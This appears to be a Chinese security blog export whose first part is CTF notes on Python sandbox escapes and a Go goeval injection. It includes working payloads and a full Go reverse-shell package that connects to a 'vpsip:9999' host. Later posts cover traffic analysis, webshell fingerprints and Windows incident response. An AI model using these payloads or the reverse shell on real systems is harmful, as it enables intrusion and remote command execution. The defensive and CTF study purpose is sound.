<tr>
<td align="left"><code>__globals__</code></td>
<td align="left">获取获取方法的全局变量(模块)字典</td>
</tr>
<tr>
<td align="left"><code>__globals__[&#39;sys&#39;].modules[&#39;os&#39;]</code></td>
<td align="left">绕过os限制,<strong><code>sys.modules</code> 是一个字典</strong>，保存了所有已被导入的模块</td>
</tr>
<tr>
<td align="left"><code>getattr()</code></td>
<td align="left">处理对象属性获取</td>
</tr>
<tr>
<td align="left"><code>__builtins__</code></td>
<td align="left">内建模块</td>
</tr>
<tr>
<td align="left"><code>__dict__</code></td>
<td align="left">对象或类的所有属性和方法</td>
</tr>
<tr>
<td align="left"><code>__mro__</code></td>
<td align="left">继承关系</td>
</tr>
</tbody></table>
<h3 id="基础payload："><a href="#基础payload：" class="headerlink" title="基础payload："></a>基础payload：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line"><span class="comment">#读文件,利用到的是object对象下的file类的read函数</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;\etc\password&#x27;</span>).read()</span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">[].__class__.__base__.__subclasses__()[-<span class="number">2</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&quot;cat flag&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="危险类"><a href="#危险类" class="headerlink" title="危险类:"></a>危险类:</h3><blockquote>
<p>(132, &lt;class ‘os._wrap_close’&gt;) 有os<br>&lt;class ‘site._Printer’&gt;有os<br>(40, &lt;class ‘file’&gt;) 有read&#x2F;write方法（python3无<code>file</code>类）<br>(258,&lt;class ‘subprocess.Popen’&gt;)<br>(59,&lt;class ‘warnings.catch_warnings’&gt;)有 file、os、eval、commands</p>
</blockquote>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过:"></a>绕过:</h2><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><ul>
<li><p>找替代</p>
</li>
<li><p>编码</p>
</li>
<li><p>反转</p>
<p><code>getattr(os, &#39;metsys&#39;[::-1])(&#39;whoami&#39;)</code></p>
</li>
<li><p>拼接</p>
<p><code>[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls /flasklight&#39;).read()</code></p>
</li>
</ul>
<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤[]</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#绕过方法1:__getitem__绕中括号限制</span></span><br><span class="line"><span class="comment">#即将mro_[2]等价于__getitem__(2)即可</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>)&lt;-&gt; 等价于<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">    &#123;&#125;.__class__.__bases__.__getitem__(<span class="number">0</span>)&lt;-&gt;等价于&#123;&#125;.__class__.__bases__.__getitem__(<span class="number">0</span>)</span><br><span class="line">    ().__class__.__bases__.__getitem__(<span class="number">0</span>)&lt;-&gt;().__class__.__bases__.__getitem__(<span class="number">0</span>)</span><br><span class="line">    request.__class__.__mro__.__getitem__(<span class="number">8</span>)&lt;-&gt;request.__class__.__mro__.__getitem__(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#绕过方法2:利用pop(40)绕</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<h3 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤."></a>过滤.</h3><p>​	<code>getattr(os, &#39;system&#39;)(&#39;whoami&#39;)</code>&#x3D;os.system(‘whoami’)</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">()[request.args.a][request.args.b][<span class="number">0</span>][request.args.c]()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="comment"># ?a=__class__&amp;b=__bases__&amp;c=__subclasses__</span></span><br></pre></td></tr></table></figure>

<h1 id="go"><a href="#go" class="headerlink" title="go"></a>go</h1><h2 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h2><p>goeval(“”, “fmt.Print(“Hello World!”)”, “fmt”)</p>
<p>跟eval差不多，各参数从左往右分别是<code>定义变量、函数或类型的代码</code>，<code>执行的go代码</code>，<code>需要导入的包</code></p>
<p>部分源码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Eval</span><span class="params">(defineCode <span class="type">string</span>, code <span class="type">string</span>, imports ...<span class="type">string</span>)</span></span> (re []<span class="type">byte</span>, err <span class="type">error</span>) &#123;</span><br><span class="line"> <span class="keyword">var</span> (</span><br><span class="line">  tmp = <span class="string">`package main</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">func main() &#123;</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">  importStr <span class="type">string</span></span><br><span class="line">  fullCode <span class="type">string</span></span><br><span class="line">   newTmpDir = tempDir + dirSeparator + RandString(<span class="number">8</span>)</span><br><span class="line"> )</span><br><span class="line"> <span class="keyword">if</span> <span class="number">0</span> &lt; <span class="built_in">len</span>(imports) &#123;</span><br><span class="line">  importStr = <span class="string">&quot;import (&quot;</span></span><br><span class="line">     <span class="comment">//遍历imports,检查空格</span></span><br><span class="line">  <span class="keyword">for</span> _, item := <span class="keyword">range</span> imports &#123;</span><br><span class="line">   <span class="keyword">if</span> blankInd := strings.Index(item, <span class="string">&quot; &quot;</span>); <span class="number">-1</span> &lt; blankInd &#123;</span><br><span class="line">    importStr += fmt.Sprintf(<span class="string">&quot;n %s &quot;</span>%s<span class="string">&quot;&quot;</span>, item[:blankInd], item[blankInd+<span class="number">1</span>:])</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    importStr += fmt.Sprintf(<span class="string">&quot;n&quot;</span>%s<span class="string">&quot;&quot;</span>, item)</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  importStr += <span class="string">&quot;n)&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> fullCode = fmt.Sprintf(tmp, importStr, defineCode, code)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其实就是生成一个临时的go文件来模拟eval命令执行,其中引入的包和define代码会写在main函数之前,比main函数提前执行.</p>
<p>当我们可操控第三个参数时,我们可以借助init函数(比main提前执行),来执行代码</p>
<p>现在就要考虑如何逃逸引号和括号来实现这个功能,可以写出如下代码</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span>	<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">cmd:=exec.Command(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">out,_:=cmd.CombinedOutput()</span><br><span class="line">fmt.Println(<span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">a=<span class="string">&quot;1&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//用var绕过)或者用const也行</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Good&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">os/exec<span class="string">&quot;%0A&quot;</span>fmt<span class="string">&quot;)%0Afunc%09init()%7B%0Acmd:=exec.Command(&quot;</span>/bin/sh<span class="string">&quot;,&quot;</span>-c<span class="string">&quot;,&quot;</span>cat\t/f*<span class="string">&quot;)%0Ares,err:=cmd.CombinedOutput()%0Afmt.Println(err)%0Afmt.Println(res)%0A&#125;%0Aconst(%0AMessage=&quot;</span>fmt</span><br><span class="line">其中用\t代替空格</span><br></pre></td></tr></table></figure>

<p>​	或者可以设置包相对路径(ftm v2i),在特定位置上传恶意包(可以反弹shell的包如下)</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> v2i</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	cmd <span class="type">string</span></span><br><span class="line">	line <span class="type">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Println</span><span class="params">(a <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	_=a</span><br><span class="line">	addr := <span class="string">&quot;vpsip:9999&quot;</span> <span class="comment">//远程连接主机名</span></span><br><span class="line">	conn,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,addr) <span class="comment">//拨号操作，用于连接服务端，需要指定协议。</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="type">byte</span>,<span class="number">10240</span>) <span class="comment">//定义一个切片的长度是10240。</span></span><br><span class="line">	<span class="keyword">for</span>  &#123;</span><br><span class="line">		n,err := conn.Read(buf) <span class="comment">//接受的命令</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err != io.EOF &#123;  <span class="comment">//io.EOF在网络编程中表示对端把链接关闭了。</span></span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		cmd_str := <span class="type">string</span>(buf[:n])</span><br><span class="line">		cmd := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,cmd_str) <span class="comment">//命令执行</span></span><br><span class="line">		stdout, err := cmd.StdoutPipe()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">defer</span> stdout.Close()</span><br><span class="line">		<span class="keyword">if</span> err := cmd.Start(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		&#125;</span><br><span class="line">		opBytes, err := ioutil.ReadAll(stdout)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		&#125;</span><br><span class="line">		conn.Write([]<span class="type">byte</span>(opBytes)) <span class="comment">//返回执行结果</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><a href="https://www.ctfiot.com/55141.html">https://www.ctfiot.com/55141.html</a></p>
]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析</title>
    <url>/2025/06/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="wireshark使用方法"><a href="#wireshark使用方法" class="headerlink" title="wireshark使用方法"></a>wireshark使用方法</h1><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤:"></a>过滤:</h2><h4 id="ip过滤"><a href="#ip过滤" class="headerlink" title="ip过滤"></a>ip过滤</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.addr = ip地址</span><br><span class="line">ip.addr = 192.168.116.138 只显示ip为192.168.116.138有关的数据流</span><br><span class="line"></span><br><span class="line">ip.src == 源ip地址</span><br><span class="line">ip.src = 192.168.116.138 只显示源IP地址为192.168.116.138的数据流</span><br><span class="line"></span><br><span class="line">ip.dst == 目的ip地址</span><br><span class="line">ip.dst = 192.168.116.138 只显示目标IP地址为192.168.116.138的数据流</span><br></pre></td></tr></table></figure>

<h4 id="协议过滤"><a href="#协议过滤" class="headerlink" title="协议过滤"></a>协议过滤</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP：只显示TCP协议的数据流</span><br><span class="line">HTTP：只显示HTTP协议的数据流</span><br><span class="line">ICMP：只显示ICMP协议的数据流</span><br><span class="line">ARP：只显示ARP协议的数据流</span><br><span class="line">DNS：显示DNS协议的数据流</span><br><span class="line">arp/icmp/http/ftp/dns/ip  筛选协议为arp/icmp/http/ftp/dns/ip的流量包</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http.request.method==“GET” 显示get请求</span><br><span class="line">http.request.method==“POST”  显示POST请求</span><br><span class="line">http.request.uri contains admin  显示url中包含admin的请求</span><br><span class="line">http.request.uri==&quot;/img/logo-edu.gif&quot;  筛选HTTP请求的URL为/img/logo-edu.gif的流量包</span><br><span class="line">http.request.code==404 显示状态码为404</span><br><span class="line">http contains &quot;FLAG&quot; 请求或相应中包含特定内容</span><br><span class="line"></span><br><span class="line">eth.dst ==A0:00:00:04:C5:84 筛选目标mac地址</span><br><span class="line">eth.addr==A0:00:00:04:C5:84 筛选MAC地址</span><br></pre></td></tr></table></figure>

<h4 id="端口过滤"><a href="#端口过滤" class="headerlink" title="端口过滤"></a>端口过滤</h4><p>srcport是源地址，dstport是目的地址，与tcp和udp搭配使用就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp.port == 80 只显示80端口TCP数据流</span><br><span class="line">udp.prot == 67 只显示67端口UDP数据流</span><br><span class="line">tcp.srcport == 80 只显示源地址的80端口数据流</span><br><span class="line">tcp.dstport == 80 只显示目的地址80端口数据流</span><br><span class="line">udp.srcport == 80  筛选udp协议的源地址的80的流量包</span><br></pre></td></tr></table></figure>

<p>注:都可以使用逻辑运算符</p>
<h2 id="例"><a href="#例" class="headerlink" title="例:"></a>例:</h2><h4 id="筛选开放端口"><a href="#筛选开放端口" class="headerlink" title="筛选开放端口"></a>筛选开放端口</h4><p>[SYN, ACK]的是正常建立了链接</p>
<p>[RST, ACK]是如果主机需要尽快关闭连接或连接超时，端口或主机不可达时发送的</p>
<p>TCP扫描确认端口开放的标志就是返回SYN+ACK的包，所以只需要过滤SYN、ACK状态都为1的包即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.162.188 and tcp.connection.synack</span><br><span class="line">tcp.flags.syn==1&amp;&amp;tcp.flags.ack==1tcp.flags.syn==1&amp;&amp;tcp.flags.ack==1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>TCP 三次握手（正常连接建立）<br>当客户端尝试连接服务器的某个端口时，典型的交互如下：</p>
<p>客户端 → 服务器：发送 [SYN]（同步序列号，表示请求建立连接）。</p>
<p>服务器 → 客户端：</p>
<p>如果端口开放：返回 [SYN, ACK]（同意建立连接）。</p>
<p>如果端口关闭：返回 [RST, ACK]（拒绝连接）。</p>
<p>客户端 → 服务器：发送 [ACK]（确认连接，完成握手）。</p>
<p>[FIN, ACK] (关闭连接时的确认包)</p>
</blockquote>
<h4 id="筛选特定文件"><a href="#筛选特定文件" class="headerlink" title="筛选特定文件"></a>筛选特定文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http and not http.request.uri contains &quot;.gif&quot;</span><br></pre></td></tr></table></figure>



<h2 id="协议简介"><a href="#协议简介" class="headerlink" title="协议简介:"></a>协议简介:</h2><p>tcp,dns之类的原始数据都是hex</p>
<p>http是数据包,可以直接显示ascii</p>
<p>原始数据中以0d0a0d0a为请求体&#x2F;响应体和请求头&#x2F;响应头的界限</p>
<h1 id="常见攻击流量"><a href="#常见攻击流量" class="headerlink" title="常见攻击流量:"></a>常见攻击流量:</h1><ul>
<li><p>蚁剑:</p>
<ol>
<li>请求体@ini_set(“display_errors”,”0”);@set_time_limit(0)开头</li>
<li>响应体base64+参数名大多<code>“_0x.....=”（下划线可替换为其他）</code></li>
</ol>
</li>
<li><p>冰蝎:</p>
<ol>
<li>AES加密 + base64编码</li>
<li>webshell连接密码的MD5的前16位，默认连接密码是”rebeyond”(即密钥是md5(‘rebeyond’)[0:16]&#x3D;e45e329feb5d925b)</li>
<li>3.0连接jsp的webshell的请求数据包中的content-type字段常见为application&#x2F;octet-stream,ua头会变</li>
</ol>
</li>
<li><p>哥斯拉:</p>
<ol>
<li>在默认脚本编码的情况下，jsp会出现<code>xc、pass字符和Java反射(ClassLoader，getClass().getClassLoader())，base64加解码</code>等特征</li>
<li><code>Cookie中有一个非常关键的特征，最后会有个分号</code>。估计后续的版本会修复</li>
</ol>
<p>解密请求包：</p>
<blockquote>
<p>URL_Decode()<br>From_Base64(‘A-Za-z0-9+&#x2F;&#x3D;’,true,false)<br>AES_Decrypt({‘option’:’UTF8’,’string’:’1710acba6220f62b’},{‘option’:’Hex’,’string’:’’},’ECB’,’Raw’,’Raw’,{‘option’:’Hex’,’string’:’’},{‘option’:’Hex’,’string’:’’})<br>Gunzip()</p>
</blockquote>
<p>解密响应包：</p>
<blockquote>
<p>Find_&#x2F;<em>Replace({‘option’:’Regex’,’string’:’B333AF03A314E0FB’},’’,true,false,true,false)<br>Find</em>&#x2F;_Replace({‘option’:’Regex’,’string’:’0F00BC7E2672E1F5’},’’,true,false,true,false)<br>From_Base64(‘A-Za-z0-9+&#x2F;&#x3D;’,true,false)<br>AES_Decrypt({‘option’:’UTF8’,’string’:’1710acba6220f62b’},{‘option’:’Hex’,’string’:’’},’ECB’,’Raw’,’Raw’,{‘option’:’Hex’,’string’:’’},{‘option’:’Hex’,’string’:’’})<br>Gunzip()</p>
</blockquote>
<p>解密后的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmdLine <span class="string">&#x27; sh -c &quot;cd &quot;/&quot;;cat /etc/os-release&quot; 2&gt;&amp;1 arg-3 2&gt;&amp;1 executableFile shexecutableArgs $ -c &quot;cd &quot;/&quot;;cat /etc/os-release&quot; 2&gt;&amp;1 arg-0 sh argsCount 4arg-1 -carg-2 cd &quot;/&quot;;cat /etc/os-release</span></span><br><span class="line"><span class="string">methodName execCommand</span></span><br></pre></td></tr></table></figure>

<p>其中实际执行的是<code>cat /etc/os-release</code></p>
</li>
</ul>
<h1 id="查找登录密码："><a href="#查找登录密码：" class="headerlink" title="查找登录密码："></a>查找登录密码：</h1><ul>
<li>常用post方法</li>
</ul>
<blockquote>
<p>http.request.method &#x3D;&#x3D; POST</p>
</blockquote>
<ul>
<li>定位具体网页,查找200回显</li>
</ul>
<blockquote>
<p>http.request.uri &#x3D;&#x3D; “xx” &amp;&amp; http.response &#x3D;&#x3D; 1</p>
</blockquote>
<ul>
<li>可能在标头</li>
<li>跳转成功会跳转302</li>
</ul>
<blockquote>
<p>http contains “admin” &amp;&amp;http.request.uri &#x3D;&#x3D; “&#x2F;login.php”</p>
</blockquote>
<ul>
<li>搜索关键字符串</li>
</ul>
<blockquote>
<p>http contains “password”&#x2F;“Authorization”</p>
</blockquote>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="SYN扫描"><a href="#SYN扫描" class="headerlink" title="SYN扫描"></a>SYN扫描</h2><p>发送syn包，返回SA包则开放,反之则关闭：</p>
<p><code>tcp.flags.syn == 1 and tcp.flags.ack == 0</code></p>
<h2 id="FIN扫描"><a href="#FIN扫描" class="headerlink" title="FIN扫描"></a>FIN扫描</h2><p>发送fin包,返回RST包则关闭,反之则开放或被过滤</p>
<p><code>tcp.flags.fin == 1</code></p>
<h2 id="udp扫描"><a href="#udp扫描" class="headerlink" title="udp扫描"></a>udp扫描</h2><p>简单封包后直接发送,ddos常用</p>
<p><code>UDP</code></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他:"></a>其他:</h2><ul>
<li>用户名 whoami-default</li>
<li>看时间顺序</li>
</ul>
<blockquote>
<p>frame.time_relative &#x2F;&#x2F;筛选相对时间<br>frame.len &#x2F;&#x2F;筛选长度</p>
</blockquote>
<ul>
<li>找服务端口，看http的host标头</li>
<li>维权找&#x2F;bin</li>
</ul>
<h1 id="内网扫描工具流量指纹"><a href="#内网扫描工具流量指纹" class="headerlink" title="内网扫描工具流量指纹"></a>内网扫描工具流量指纹</h1><p><a href="https://blog.csdn.net/Javachichi/article/details/142128840">https://blog.csdn.net/Javachichi/article/details/142128840</a></p>
<h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>扫描特征:</p>
<ul>
<li><p>使用操作系统的TCP全连接,非半连接扫描</p>
<p>即完成完整的三次握手</p>
</li>
</ul>
<p><img src="/../images/image-20250609220748704.png" alt="image-20250609220748704"></p>
<p>存活检测:</p>
<ul>
<li>仅使用ICMP Echo请求</li>
<li>Echo请求无负载,类似Nmap（不携带数据）</li>
</ul>
<p><img src="/../images/image-20250609220612168.png" alt="image-20250609220612168"></p>
<h2 id="goby"><a href="#goby" class="headerlink" title="goby"></a>goby</h2><p>SYN扫描特征:</p>
<ul>
<li>使用TCP半连接扫描,类似Nmap和Masscan</li>
</ul>
<p>存活检测: Goby的存活检测方法比较特别:</p>
<ul>
<li>使用UDP探活:发送数据包到一个不太可能开放的UDP端口,等待ICMP端口不可达响应</li>
<li>使用固定的端口和数据payload,这给了Goby明显的特征</li>
</ul>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>SYN扫描特征:</p>
<ul>
<li>TCP窗口大小固定为1024</li>
<li>TCP选项使用固定的值:02 04 05 b4 (这是TCP选项中最短的长度)</li>
</ul>
<p>存活检测:</p>
<ul>
<li><p>ICMP Echo请求 (就是我们熟悉的ping) 特征: Nmap发送的ICMP Echo请求没有额外的数据负载</p>
</li>
<li><p>ICMP时间戳请求 这是另一种ICMP请求,用于获取目标系统的时间</p>
</li>
<li><p>ACK诱导RST 向目标发送ACK包,如果目标存活,会回复RST包</p>
</li>
<li><p>常见端口SYN探测 对80和443等常用端口发送SYN包,观察响应</p>
</li>
</ul>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>不只是日志分析-windows篇</title>
    <url>/2025/06/10/windows-%E4%B8%8D%E5%8F%AA%E6%98%AF%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="常用的软件"><a href="#常用的软件" class="headerlink" title="常用的软件"></a>常用的软件</h1><table>
<thead>
<tr>
<th>软件名</th>
<th>作用</th>
<th>快捷启动（win+R）</th>
</tr>
</thead>
<tbody><tr>
<td>事件查看器</td>
<td>审计事件日志(安全类可以看到用户类操作日志，登录成功&#x2F;失败……)</td>
<td>eventvwr.msc</td>
</tr>
<tr>
<td>计划任务程序</td>
<td>查看计划任务</td>
<td>taskschd.msc</td>
</tr>
<tr>
<td>服务</td>
<td>查看各种服务</td>
<td>services.msc</td>
</tr>
<tr>
<td>注册表</td>
<td>存储系统和应用程序的设置信息</td>
<td>regedit</td>
</tr>
<tr>
<td>用户账户</td>
<td>用户权限设置</td>
<td>netplwiz</td>
</tr>
<tr>
<td>本地用户和组</td>
<td>可以查看隐藏的用户</td>
<td>lusrmgr.msc</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h1 id="常见的windows事件id"><a href="#常见的windows事件id" class="headerlink" title="常见的windows事件id"></a>常见的windows事件id</h1><p>记得时间排序</p>
<h2 id="安全日志相关事件ID"><a href="#安全日志相关事件ID" class="headerlink" title="安全日志相关事件ID"></a>安全日志相关事件ID</h2><table>
<thead>
<tr>
<th>事件ID</th>
<th>事件名称</th>
<th>描述说明</th>
</tr>
</thead>
<tbody><tr>
<td>4624</td>
<td>成功的账户登录事件</td>
<td>记录登录账号、时间、来源IP等信息，帮助识别非法登录</td>
</tr>
<tr>
<td>4625</td>
<td>账户登录失败事件</td>
<td>记录未成功的登录尝试，用于检测密码爆破或非法访问</td>
</tr>
<tr>
<td>4634</td>
<td>用户注销事件</td>
<td>记录用户主动注销或系统超时自动注销</td>
</tr>
<tr>
<td>4672</td>
<td>特权账户登录事件</td>
<td>当管理员&#x2F;特权账号登录时记录，监控高权限用户活动</td>
</tr>
<tr>
<td>4738</td>
<td>用户账户管理</td>
<td>可以用来看用户账户更改</td>
</tr>
<tr>
<td>4688</td>
<td>新进程创建事件</td>
<td>记录进程创建信息，检测恶意软件执行行为</td>
</tr>
<tr>
<td>4697</td>
<td>服务安装事件</td>
<td>记录系统服务安装操作，识别未经授权的服务</td>
</tr>
<tr>
<td>4768</td>
<td>Kerberos认证票据授予事件</td>
<td>与域控制器身份验证相关，分析域账号滥用情况</td>
</tr>
<tr>
<td>4776</td>
<td>NTLM认证失败事件</td>
<td>记录NTLM认证失败，检测异常身份验证行为</td>
</tr>
<tr>
<td>4719</td>
<td>审计策略更改事件</td>
<td>监控审计策略变更，判断是否有恶意用户试图掩盖操作痕迹</td>
</tr>
<tr>
<td>4663</td>
<td>文件和目录的访问尝试</td>
<td>可以用来看用户访问成功的文件</td>
</tr>
</tbody></table>
<p>注：<strong>TargetUserName</strong>为windows用户名</p>
<h2 id="系统日志相关事件ID"><a href="#系统日志相关事件ID" class="headerlink" title="系统日志相关事件ID"></a>系统日志相关事件ID</h2><table>
<thead>
<tr>
<th>事件ID</th>
<th>事件名称</th>
<th>描述说明</th>
</tr>
</thead>
<tbody><tr>
<td>6005</td>
<td>事件日志服务启动</td>
<td>系统启动事件日志服务时记录</td>
</tr>
<tr>
<td>6006</td>
<td>事件日志服务停止</td>
<td>系统关机前记录，配合其他日志判断异常关机</td>
</tr>
<tr>
<td>6008</td>
<td>非正常关机事件</td>
<td>系统意外关闭时记录，检测崩溃或强制关机行为</td>
</tr>
<tr>
<td>7045</td>
<td>服务安装事件</td>
<td>记录新服务安装操作，分析恶意服务安装行为</td>
</tr>
<tr>
<td><strong>12</strong></td>
<td>系统启动时间</td>
<td>启动次数</td>
</tr>
<tr>
<td><strong>13</strong></td>
<td>系统关机时间</td>
<td>关机次数</td>
</tr>
<tr>
<td><strong>1074</strong></td>
<td>重启</td>
<td>系统重启,关闭或者注销</td>
</tr>
</tbody></table>
<p>注:更改用户名后的第一次重启,算在system里</p>
<h2 id="应用程序日志相关事件ID"><a href="#应用程序日志相关事件ID" class="headerlink" title="应用程序日志相关事件ID"></a>应用程序日志相关事件ID</h2><table>
<thead>
<tr>
<th>事件ID</th>
<th>事件名称</th>
<th>描述说明</th>
</tr>
</thead>
<tbody><tr>
<td>1000</td>
<td>应用程序崩溃事件</td>
<td>记录崩溃详情（含错误代码、故障模块名称等）</td>
</tr>
<tr>
<td>4621</td>
<td>应用程序挂起事件</td>
<td>分析应用程序无响应&#x2F;卡死的原因</td>
</tr>
</tbody></table>
<h1 id="查找隐藏用户-影子用户"><a href="#查找隐藏用户-影子用户" class="headerlink" title="查找隐藏用户&amp;影子用户"></a>查找隐藏用户&amp;影子用户</h1><ul>
<li>lusrmgr.msc查看用户组（后缀带$）</li>
<li>注册表地址：HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</li>
</ul>
<h1 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h1><ul>
<li>自启动文件夹：shell:setup</li>
<li>注册表自启动(将绝对路径下程序进行字符串值保存会开机自启)：HKEY*<em>CURRENT</em>*USER\Software\Microsoft\Windows\CurrentVersion\Run</li>
<li>计划任务程序：taskschd.msc</li>
<li>目录下翻找bat文件和可疑exe文件</li>
</ul>
<h1 id="查看远程shell连接ip"><a href="#查看远程shell连接ip" class="headerlink" title="查看远程shell连接ip"></a>查看远程shell连接ip</h1><ul>
<li>寻找可疑ip和端口</li>
</ul>
<blockquote>
<p>排查思路：</p>
<ol>
<li><p>根据端口排查</p>
</li>
<li><p>查询可疑ip</p>
</li>
<li><p>PID排查</p>
<p>tasklist | findstr “PID” #寻找启动文件</p>
